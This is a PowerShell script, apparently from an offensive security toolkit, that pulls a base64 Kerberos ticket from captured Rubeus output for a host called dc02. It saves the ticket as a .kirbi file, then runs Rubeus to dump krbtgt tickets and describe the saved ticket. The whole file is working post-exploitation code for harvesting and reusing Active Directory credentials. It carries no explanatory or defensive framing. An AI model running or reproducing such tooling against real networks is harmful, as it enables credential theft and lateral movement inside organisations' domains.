[CmdletBinding()]
param(
    [string]$SourceFile = 'C:\Windows\Temp\cadre-tools\T102-capture\dc02_tgs.txt',
    [string]$OutKirbi = 'C:\Windows\Temp\cadre-tools\T102-capture\dc02.kirbi'
)
$ErrorActionPreference = 'Continue'

$content = Get-Content $SourceFile -Raw

# Find the Base64EncodedTicket section and collect the base64 lines (indented chunks)
$lines = Get-Content $SourceFile
$inTicket = $false
$b64 = ''
foreach ($line in $lines) {
    if ($line -match 'Base64EncodedTicket') { $inTicket = $true; continue }
    if ($inTicket) {
        $trimmed = $line.Trim()
        # Rubeus base64 chunks are long alphanumeric+/= strings; stop at next section header
        if ($trimmed -match '^\[\*\]') { break }
        if ($trimmed -match '^[A-Za-z0-9+/]+={0,2}$') {
            $b64 += $trimmed
        }
    }
}

if (-not $b64) {
    Write-Output "NO_BASE64_FOUND"
    exit 1
}

$bytes = [System.Convert]::FromBase64String($b64)
[System.IO.File]::WriteAllBytes($OutKirbi, $bytes)
Write-Output "KIRBI_WRITTEN $OutKirbi | $($bytes.Length) bytes"

# Verify with Rubeus
$rubeus = 'C:\Windows\Temp\cadre-tools\Rubeus.exe'
& $rubeus dump /service:krbtgt /luid:0x0 2>&1 | Out-Null
& $rubeus describe /ticket:$OutKirbi 2>&1 | ForEach-Object { Write-Output "DESCRIBE|$_" }
